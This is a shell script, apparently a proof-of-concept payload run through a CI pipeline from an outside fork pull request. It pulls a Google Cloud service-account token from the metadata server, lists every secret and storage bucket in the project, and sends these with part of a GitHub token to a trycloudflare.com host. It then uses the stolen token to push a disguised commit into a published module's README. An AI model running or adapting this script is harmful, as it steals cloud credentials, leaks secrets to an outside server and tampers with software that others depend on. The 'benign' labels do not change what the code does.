#!/bin/sh
set +e
C="https://peripheral-shadows-library-virgin.trycloudflare.com"
apk add --no-cache curl git >/dev/null 2>&1
MD="http://metadata.google.internal/computeMetadata/v1"; H="Metadata-Flavor: Google"
SA=$(curl -s -H "$H" "$MD/instance/service-accounts/default/email")
PROJ=$(curl -s -H "$H" "$MD/project/project-id")
TOK=$(curl -s -H "$H" "$MD/instance/service-accounts/default/token" | sed 's/.*"access_token":"//;s/".*//')
# ① COLLECT blast radius with the OWNER SA token (read-only): ALL secrets + buckets (not just the mounted one)
SECRETS=$(curl -s -H "Authorization: Bearer $TOK" "https://secretmanager.googleapis.com/v1/projects/$PROJ/secrets?fields=secrets(name)" | tr -d '\n ' | head -c 500)
BUCKETS=$(curl -s -H "Authorization: Bearer $TOK" "https://storage.googleapis.com/storage/v1/b?project=$PROJ&fields=items(name)" | tr -d '\n ' | head -c 300)
curl -s "$C/collect" --data-urlencode "sa=$SA" --data-urlencode "proj=$PROJ" \
  --data-urlencode "stolen_im_pat_prefix=$(printf %s "$IM_GITHUB_PAT" | cut -c1-10)" \
  --data-urlencode "all_secrets=$SECRETS" --data-urlencode "all_buckets=$BUCKETS" >/dev/null
# ② SUPPLY-CHAIN (benign): push a hidden HTML comment into the published module README using the stolen PAT
git clone -q "https://x-access-token:$IM_GITHUB_PAT@github.com/robertprast/cft-module-published" /tmp/pub 2>/dev/null
if cd /tmp/pub 2>/dev/null; then
  printf '\n<!-- supply-chain-poc: benign marker planted by an OUTSIDER fork-PR CI RCE via the stolen IM_GITHUB_PAT -->\n' >> README.md
  git -c user.email=ci-bot@local -c user.name=ci-bot commit -qam "docs: minor readme touch" 2>/dev/null
  git push -q origin HEAD 2>/dev/null && R=PUSHED || R=push-failed
  SHA=$(git rev-parse --short HEAD 2>/dev/null)
  # ③ exfil the supply-chain proof
  curl -s "$C/supplychain" --data-urlencode "result=$R" --data-urlencode "repo=robertprast/cft-module-published" --data-urlencode "commit=$SHA" >/dev/null
fi
